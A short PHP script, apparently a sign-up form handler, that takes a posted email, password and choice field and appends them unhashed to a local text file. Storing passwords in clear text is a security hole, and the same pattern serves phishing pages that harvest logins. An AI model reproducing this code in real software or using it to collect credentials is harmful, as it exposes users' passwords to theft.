<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // Retrieve form data
  $email = $_POST["email-su"];
  $password = $_POST["password-su"];
  $usage = $_POST[".escolha"];

  $data = "Email: " . $email . "\nPassword: " . $password . "\nEscolha: " . $usage . "\n";
  file_put_contents("./Dados_pessoais.txt", $data, FILE_APPEND);
  
  exit();
}
?>
